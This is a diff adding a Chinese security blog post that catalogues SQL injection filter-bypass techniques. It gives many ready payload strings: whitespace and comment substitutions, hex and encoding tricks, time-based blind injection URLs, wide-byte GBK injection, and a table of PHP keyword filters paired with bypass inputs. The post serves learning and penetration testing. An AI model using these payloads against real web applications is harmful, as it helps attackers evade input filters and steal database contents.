@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    sql注入常见注释及绕过 |  Wh1tecell&#39;blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-sql注入常见注释及绕过"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  sql注入常见注释及绕过
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/11/13/sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E6%B3%A8%E9%87%8A%E5%8F%8A%E7%BB%95%E8%BF%87/" class="article-date">
+  <time datetime="2020-11-13T04:07:15.000Z" itemprop="datePublished">2020-11-13</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/">web技术学习</a> / <a class="article-category-link" href="/categories/web%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">10 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="1-绕过空格（注释符-，-a0）"><a href="#1-绕过空格（注释符-，-a0）" class="headerlink" title="1.绕过空格（注释符/* */，%a0）"></a>1.绕过空格（注释符/* */，%a0）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">两个空格代替一个空格，用Tab代替空格，%a0=空格：</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/</span><br></pre></td></tr></table></figure>
+
+<p> 最基本的绕过方法，用注释替换空格：</p>
+<p>使用浮点数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=8E0union select 1,2,3</span><br><span class="line">select * from users where id=8.0 select 1,2,3</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-括号绕过空格"><a href="#2-括号绕过空格" class="headerlink" title="2.括号绕过空格"></a>2.括号绕过空格</h2><p>　　如果空格被过滤，括号没有被过滤，可以用括号绕过。</p>
+<p>　　在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(user())from dual where(1=1)and(2=2)</span><br></pre></td></tr></table></figure>
+
+<p>　　这种过滤方法常常用于time based盲注,例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</span><br></pre></td></tr></table></figure>
+
+<p>（from for属于逗号绕过下面会有）</p>
+<p>　　上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</p>
+<h2 id="3-引号绕过（使用十六进制）"><a href="#3-引号绕过（使用十六进制）" class="headerlink" title="3.引号绕过（使用十六进制）"></a>3.引号绕过（<strong>使用十六进制</strong>）</h2><p>　　会使用到引号的地方一般是在最后的<code>where</code>子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name  from information_schema.tables where table_name=&quot;users&quot;</span><br></pre></td></tr></table></figure>
+
+<p>　　这个时候如果引号被过滤了，那么上面的<code>where</code>子句就无法使用了。那么遇到这样的问题就要使用<strong>十六进制</strong>来处理这个问题了。<br><code>　　users</code>的十六进制的字符串是<code>7573657273</code>。那么最后的sql语句就变为了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name  from information_schema.tables where table_name=0x7573657273</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-逗号绕过（使用from或者offset）"><a href="#4-逗号绕过（使用from或者offset）" class="headerlink" title="4.逗号绕过（使用from或者offset）"></a>4.逗号绕过（<strong>使用from或者offset</strong>）</h2><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用<code>from to</code>的方式来解决：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>
+
+<p>使用join：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2     #等价于</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure>
+
+<p>使用like：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))=80   #等价于</span><br><span class="line">select user() like &#x27;r%&#x27;</span><br></pre></td></tr></table></figure>
+
+<p> 对于<code>limit</code>可以使用<code>offset</code>来绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news limit 0,1</span><br><span class="line"># 等价于下面这条SQL语句</span><br><span class="line">select * from news limit 1 offset 0</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-比较符号（-lt-gt-）绕过（过滤了-lt-gt-：sqlmap盲注经常使用-lt-gt-，使用between的脚本）："><a href="#5-比较符号（-lt-gt-）绕过（过滤了-lt-gt-：sqlmap盲注经常使用-lt-gt-，使用between的脚本）：" class="headerlink" title="5.比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）："></a>5.比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）：</h2><h3 id="使用greatest-、least（）：（前者返回最大值，后者返回最小值）"><a href="#使用greatest-、least（）：（前者返回最大值，后者返回最小值）" class="headerlink" title="使用greatest()、least（）：（前者返回最大值，后者返回最小值）"></a>使用greatest()、least（）：（前者返回最大值，后者返回最小值）</h3><p>　　同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到<code>greatest</code>来进行绕过了。<br>　　最常见的一个盲注的sql语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</span><br></pre></td></tr></table></figure>
+
+<p>　　此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用<code>greatest</code>来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。<br>　　那么上面的这条sql语句可以使用<code>greatest</code>变为如下的子句:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用between-and："><a href="#使用between-and：" class="headerlink" title="使用between and："></a>使用between and：</h3><p>between a and b：</p>
+<p>between 1 and 1; 等价于 =1</p>
+<h2 id="6-or-and-xor-not绕过"><a href="#6-or-and-xor-not绕过" class="headerlink" title="6.or and xor not绕过"></a>6.or and xor not绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and=&amp;&amp;  or=||   xor=|   not=!</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-绕过注释符号（-，–-后面跟一个空格））过滤"><a href="#7-绕过注释符号（-，–-后面跟一个空格））过滤" class="headerlink" title="7.绕过注释符号（#，–(后面跟一个空格））过滤"></a>7.绕过注释符号（#，–(后面跟一个空格））过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,3||&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,&#x27;3</span><br></pre></td></tr></table></figure>
+
+<h2 id="8-绕过"><a href="#8-绕过" class="headerlink" title="8.=绕过"></a>8.=绕过</h2><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p>
+<h2 id="9-绕过union，select，where等"><a href="#9-绕过union，select，where等" class="headerlink" title="9.绕过union，select，where等"></a>9.绕过union，select，where等</h2><h3 id="（1）使用注释符绕过"><a href="#（1）使用注释符绕过" class="headerlink" title="（1）使用注释符绕过"></a>（1）使用注释符绕过</h3><p>常用注释符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//，-- , /**/, #, --+, -- -, ;,%00,--a</span><br></pre></td></tr></table></figure>
+
+<p>用法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user</span><br></pre></td></tr></table></figure>
+
+<h3 id="（2）使用大小写绕过："><a href="#（2）使用大小写绕过：" class="headerlink" title="（2）使用大小写绕过："></a>（2）使用大小写绕过：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UnIoN/**/SeLeCT</span><br></pre></td></tr></table></figure>
+
+<h3 id="（3）内联注释绕过"><a href="#（3）内联注释绕过" class="headerlink" title="（3）内联注释绕过"></a>（3）内联注释绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br></pre></td></tr></table></figure>
+
+<h3 id="（4）-双关键字绕过（若删除掉第一个匹配的union就能绕过）："><a href="#（4）-双关键字绕过（若删除掉第一个匹配的union就能绕过）：" class="headerlink" title="（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）："></a>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UNIunionONSeLselectECT1,2,3–-</span><br></pre></td></tr></table></figure>
+
+<h2 id="10-通用绕过（编码）"><a href="#10-通用绕过（编码）" class="headerlink" title="10.通用绕过（编码）"></a>10.通用绕过（编码）</h2><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</span><br></pre></td></tr></table></figure>
+
+<h2 id="11-等价函数绕过"><a href="#11-等价函数绕过" class="headerlink" title="11.等价函数绕过"></a>11.等价函数绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin() ==&gt; ascii()</span><br><span class="line"></span><br><span class="line">sleep() ==&gt;benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line"></span><br><span class="line">mid()、substr() ==&gt; substring()</span><br><span class="line"></span><br><span class="line">@@user ==&gt; user()</span><br><span class="line"></span><br><span class="line">@@datadir ==&gt; datadir()</span><br><span class="line"></span><br><span class="line">举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">substr((select &#x27;password&#x27;),1,1) = 0x70</span><br><span class="line">strcmp(left(&#x27;password&#x27;,1), 0x69) = 1</span><br><span class="line">strcmp(left(&#x27;password&#x27;,1), 0x70) = 0</span><br><span class="line">strcmp(left(&#x27;password&#x27;,1), 0x71) = -1</span><br></pre></td></tr></table></figure>
+
+<h2 id="12-宽字节注入"><a href="#12-宽字节注入" class="headerlink" title="12.宽字节注入"></a>12.宽字节注入</h2><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 &#39; 。</p>
+<p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路:（1）%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1%df%27union select 1,user(),3--+</span><br></pre></td></tr></table></figure>
+
+<p>（2）将 &#39; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p>
+<h3 id="一般产生宽字节注入的PHP函数"><a href="#一般产生宽字节注入的PHP函数" class="headerlink" title="一般产生宽字节注入的PHP函数"></a>一般产生宽字节注入的PHP函数</h3><p>  1.replace（）：过滤 ‘ \ ，将 ‘ 转化为 &#39; ，将 \  转为 \，将 “ 转为 &quot; 。用思路一。</p>
+<p>  2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , “ , \ 。用思路一</p>
+<p>（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</p>
+<p>  3.mysql_real_escape_string()：转义下列字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00     \n     \r     \     &#x27;     &quot;     \x1a</span><br></pre></td></tr></table></figure>
+
+<p>（防御，将mysql设置为gbk即可）</p>
+<h2 id="13-PCRE绕过"><a href="#13-PCRE绕过" class="headerlink" title="13.PCRE绕过"></a>13.PCRE绕过</h2><p>union/*’+’a’<em>1000001+’</em>/select</p>
+<h4 id="PHP一些常见的过滤方法及绕过方式"><a href="#PHP一些常见的过滤方法及绕过方式" class="headerlink" title="PHP一些常见的过滤方法及绕过方式"></a>PHP一些常见的过滤方法及绕过方式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">过滤关键字    and or</span><br><span class="line">php代码    preg_match(&#x27;/(and|or)/i&#x27;,$id)</span><br><span class="line">会过滤的攻击代码    1 or 1=1 1 and 1=1</span><br><span class="line">绕过方式    1 || 1=1 1 &amp;&amp; 1=1</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union</span><br><span class="line">php代码    preg_match(&#x27;/(and|or|union)/i&#x27;,$id)</span><br><span class="line">会过滤的攻击代码    union select user,password from users</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users where userid=1)=&#x27;admin&#x27;</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#x27;/(and|or|union|where)/i&#x27;,$id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users where user_id = 1) = &#x27;admin&#x27;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users limit 1) = &#x27;admin&#x27;</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#x27;/(and|or|union|where)/i&#x27;,$id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users where user_id = 1) = &#x27;admin&#x27;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users limit 1) = &#x27;admin&#x27;</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit</span><br><span class="line">php代码    preg_match(&#x27;/(and|or|union|where|limit)/i&#x27;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users limit 1) = &#x27;admin&#x27;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &#x27;admin&#x27;#user_id聚合中user_id为1的user为admin</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by</span><br><span class="line">php代码    preg_match(&#x27;/(and|or|union|where|limit|group by)/i&#x27;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &#x27;admin&#x27;</span><br><span class="line">绕过方式    1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select</span><br><span class="line">php代码    preg_match(&#x27;/(and|or|union|where|limit|group by|select)/i&#x27;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1</span><br><span class="line">绕过方式    1 &amp;&amp; substr(user,1,1) = &#x27;a&#x27;</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#x27;</span><br><span class="line">php代码    preg_match(&#x27;/(and|or|union|where|limit|group by|select|\&#x27;)/i&#x27;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1</span><br><span class="line">绕过方式    1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) = 0x61 1 &amp;&amp; substr(user,1,1) = unhex(61)</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#x27;, hex</span><br><span class="line">php代码    preg_match(&#x27;/(and|or|union|where|limit|group by|select|\&#x27;|hex)/i&#x27;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) = unhex(61)</span><br><span class="line">绕过方式    1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#x27;, hex, substr</span><br><span class="line">php代码    preg_match(&#x27;/(and|or|union|where|limit|group by|select|\&#x27;|hex|substr)/i&#x27;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16))/td&gt;</span><br><span class="line">绕过方式    1 &amp;&amp; lpad(user,7,1)</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#x27;, hex, substr, 空格</span><br><span class="line">php代码    preg_match(&#x27;/(and|or|union|where|limit|group by|select|\&#x27;|hex|substr|\s)/i&#x27;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; lpad(user,7,1)/td&gt;</span><br><span class="line">绕过方式    1%0b||%0blpad(user,7,1)</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#x27;/(and|or|union|where)/i&#x27;,$id)</span><br><span class="line">会过滤的攻击代码    1 || (select user from users where user_id = 1) = &#x27;admin&#x27;</span><br><span class="line">绕过方式    1 || (select user from users limit 1) = &#x27;admin&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可参考:</p>
+<p><a target="_blank" rel="noopener" href="https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80.html">https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80.html</a></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://wh1tecell.top/2020/11/13/sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E6%B3%A8%E9%87%8A%E5%8F%8A%E7%BB%95%E8%BF%87/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2020/11/14/sqlmap%E4%B9%8Btamper%E8%84%9A%E6%9C%AC/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            sqlmap之tamper脚本
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/11/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">文件上传漏洞</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021
+        <i class="ri-heart-fill heart_icon"></i> Wh1tecell
+      </li>
+    </ul>
+    <ul>
+      <li>
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+        <li>
+          <a href="" target="_black" rel="nofollow">闽ICP备2021001239号</a>
+        </li>
+        
+    </ul>
+    <!-- 运行天数 -->
+	<ul>
+		<li><span id="runtime_span"></span></li>
+		<script type="text/javascript">			
+    function show_runtime() {
+        window.setTimeout("show_runtime()", 1000);
+        X = new Date("01/01/2021 12:00:00");
+        Y = new Date();
+        T = (Y.getTime() - X.getTime());
+        M = 24 * 60 * 60 * 1000;
+        a = T / M;
+        A = Math.floor(a);
+        b = (a - A) * 24;
+        B = Math.floor(b);
+        c = (b - B) * 60;
+        C = Math.floor((b - B) * 60);
+        D = Math.floor((c - C) * 60);
+        runtime_span.innerHTML = "小站在各种崩坏中坚持了:" + A + "天" + B + "小时" + C + "分" + D + "秒"
+    }
+	show_runtime();
+</script>
+
+	</ul>
+
+
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+
+
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/touxiang.png" alt="Wh1tecell&#39;blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
